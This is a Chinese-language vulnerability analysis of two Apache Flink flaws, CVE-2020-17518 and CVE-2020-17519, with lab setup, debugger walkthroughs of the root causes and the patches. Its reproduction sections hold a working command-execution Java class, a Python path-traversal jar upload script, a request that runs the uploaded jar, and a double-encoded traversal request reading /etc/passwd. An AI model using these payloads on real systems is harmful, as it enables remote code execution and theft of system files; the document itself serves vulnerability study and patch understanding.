# Apache Flink 漏洞分析

# 前言

`Apache Flink`是一个框架和分布式处理引擎，用于对无界和有界数据流进行状态计算。

# 环境搭建

这里选择`Flink-1.11.2`版本：[https://archive.apache.org/dist/flink/flink-1.11.2/](https://archive.apache.org/dist/flink/flink-1.11.2/)。

解压缩后，修改配置文件`conf/flink-conf.yaml`中`jobmanager.rpc.address`参数为本地服务器`IP`地址。

```bash
tar -zxvf flink-1.11.2-bin-scala_2.11.tgz
```

```java
jobmanager.rpc.address: 192.168.10.32
```

修改`bin/config.sh`文件，为`DEFAULT_ENV_PID_DIR`指定为新建的路径，这是因为`Flink`启动时会把启动的进程`ID`存到一个文件中，默认是`/tmp`下，由于是临时目录，会被系统清理，存放的进程`ID`会找不到，从而导致无法关闭集群

```bash
DEFAULT_ENV_PID_DIR="/Users/alphag0/Desktop/flink-1.11.2/tmp"                          # Directory to store *.pid files to
```

添加远程调试参数后启动`Flink`服务

```java
# 远程调试
env.java.opts.jobmanager: "-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5006"
#  taskmanager debug端口
env.java.opts.taskmanager: "-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005"
# 设置cliFrontend 客户端的debug端口
env.java.opts.client: "-agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=5008"

rest.connection-timeout: 360000000
rest.idleness-timeout: 360000000
```

```bash
cd bin
./start-cluster.sh
```

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled.png)

下载对应版本的源码：[https://github.com/apache/flink/releases/tag/release-1.11.2](https://github.com/apache/flink/releases/tag/release-1.11.2)，在`IDEA`中创建`Remote`配置，指定`Host`和`Port`，设置完成后点击`Debug`按钮运行。

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%201.png)

# 漏洞

## CVE-2020-17518

### 漏洞描述

[NVD - CVE-2020-17518](https://nvd.nist.gov/vuln/detail/CVE-2020-17518)

```
Apache Flink 1.5.1 introduced a REST handler that allows you to write an uploaded file to an arbitrary location on the local file system, through a maliciously modified HTTP HEADER. The files can be written to any location accessible by Flink 1.5.1. All users should upgrade to Flink 1.11.3 or 1.12.0 if their Flink instance(s) are exposed. The issue was fixed in commit a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4 from apache/flink:master.
```

### 漏洞复现

- 编写恶意类并编译成`jar`包。

```java
import java.io.InputStream;
import java.util.Scanner;

public class Execute {
    public static void main(String[] args) throws Exception {
    	String cmd = args[0];
        try {
            if (cmd != null) {
                boolean isLinux = true;
                String osType = System.getProperty("os.name");
                if (osType != null && osType.toLowerCase().contains("win")) {
                    isLinux = false;
                }

                String[] command = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream inputStream = Runtime.getRuntime().exec(command).getInputStream();
                Scanner scanner = new Scanner(inputStream).useDelimiter("h3rmesk1t");
                String output = scanner.hasNext() ? "\n" + scanner.next() : "";
                throw new Exception((output));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

- 获取`Flink`运行目录，通过接口`/jobmanager/config`可以获取`web.tmpdir`的路径。

```html
GET /jobmanager/config HTTP/1.1
Host: 192.168.10.32:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
```

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%202.png)

- 利用漏洞上传`jar`包，构造请求数据包，上传`jar`包至目录`/var/folders/ch/d7lw4k6j2dn0sc9hnjnlzrg40000gp/T/flink-web-c9f4b5d7-3d33-42b1-8d8f-fa510a7c3d32/flink-web-upload`下

```python
import requests
url = 'http://192.168.10.32:8081/jars/upload'

files = {
    'file': ('../../../../../../../../../../../../../../../../../../var/folders/ch/d7lw4k6j2dn0sc9hnjnlzrg40000gp/T/flink-web-c9f4b5d7-3d33-42b1-8d8f-fa510a7c3d32/flink-web-upload/Execute.jar', open(r'Execute.jar','rb'), 'form-data;name="jarfile"')
}

r = requests.post(url, files=files)
print(r.text)
```

- 利用上传的`jar`来执行命令。

```html
POST /jars/Execute.jar/run?entry-class=Execute&program-args=%22open%20-a%20Calculator%22 HTTP/1.1
Host: 192.168.10.32:8081
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
```

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%203.png)

### 漏洞分析

在漏洞通报中给出了漏洞修复相关的`commit`，[https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4#diff-7920624ff6651ac9897c79309c0a94073a4e7afb111e926c8341492f3a730051](https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4#diff-7920624ff6651ac9897c79309c0a94073a4e7afb111e926c8341492f3a730051)。

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%204.png)

在`FileUploadHandler.java`的相关代码处下断点，在获取到`HTTP`的请求数据包后，先调用`org.apache.flink.shaded.netty4.io.netty.handler.codec.http.multipart.DiskFileUpload#getFilename`方法来获取文件名。

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%205.png)

接着调用`sun.nio.fs.AbstractPath#resolve`方法来处理上传文件路径，调用`sun.nio.fs.UnixPath#resolve`方法来解析上传路径，由于上传路径开头不为`/`，因此会进一步处理。

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%206.png)

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%207.png)

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%208.png)

上述处理操作中，调用`System.arraycopy`将上传路径与系统路径进拼接，变量`dest`存储拼接后的上传路径，并传给`org.apache.flink.shaded.netty4.io.netty.handler.codec.http.multipart.fileUpload#renameTo`方法。

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%209.png)

调用`java.io.File#renameTo`方法，接着调用`java.io.UnixFileSystem#rename`方法来生成缓存文件，此时系统会按目标路径写入文件。

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2010.png)

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2011.png)

### 漏洞补丁

调用`java.io.File#getName`方法来进行处理，对传入的`filename`进行截断，只取末尾的文件名，传递的`../`和目录名均被忽略。

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2012.png)

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2013.png)

## CVE-2020-17519

### 漏洞描述

[NVD - CVE-2020-17519](https://nvd.nist.gov/vuln/detail/CVE-2020-17519)

```
A change introduced in Apache Flink 1.11.0 (and released in 1.11.1 and 1.11.2 as well) allows attackers to read any file on the local filesystem of the JobManager through the REST interface of the JobManager process. Access is restricted to files accessible by the JobManager process. All users should upgrade to Flink 1.11.3 or 1.12.0 if their Flink instance(s) are exposed. The issue was fixed in commit b561010b0ee741543c3953306037f00d7a9f0801 from apache/flink:master.
```

### 漏洞复现

```html
GET /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd HTTP/1.1
Host: 192.168.10.32:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
```

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2014.png)

### 漏洞分析

在漏洞通报中给出了漏洞修复相关的`commit`，[https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801](https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801)。

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2015.png)

在commit的描述中不难看出，利用二次编码后的`..%252f`来替换`../`可以遍历`logs`文件夹的目录结构，例如，利用`/jobmanager/logs/..%252f/README.txt`可以返回`README.txt`的内容。

在`org.apache.flink.runtime.rest.handler.cluster.JobManagerCustomLogHandler#getFile`方法中下断点，可以看到会获取`pathParams`中存放的`filename`，拼接`logDir`返回路径，接着读取文件内容作为响应。

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2016.png)

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2017.png)

注意到`pathParams`中存放的`filename`是已经解码后的内容，查看堆栈信息往前追溯一下解码的过程，跟进`org.apache.flink.runtime.rest.handler.router.RouterHandler#channelRead0`方法。

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2018.png)

调用`org.apache.flink.shaded.netty4.io.netty.handler.codec.http.QueryStringDecoder#decodeComponent`方法进行第一次解码，并将解码后的值赋值给`this.path`**。**

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2019.png)

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2020.png)

接着将`method`、`path`、`queryParameters`赋值给`org.apache.flink.runtime.rest.handler.router.Router#route`方法来初始化一个`routeResult`对象，跟进`org.apache.flink.runtime.rest.handler.router.Router#route`方法，调用`org.apache.flink.runtime.rest.handler.router.Router#decodePathTokens`方法进行二次解码。

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2021.png)

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2022.png)

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2023.png)

漏洞触发点也就在`org.apache.flink.runtime.rest.handler.router.Router#decodePathTokens`方法中，该方法在二次解码前会先判断路径中存在的`/`并截断，由于此时传入的`/`依旧还是编码的形式，并不会被截断，在随后的`for`循环中进行二次解码，成功返回一个正常路径。

### 漏洞补丁

依旧是采用`java.io.File#getName`方法来进行处理。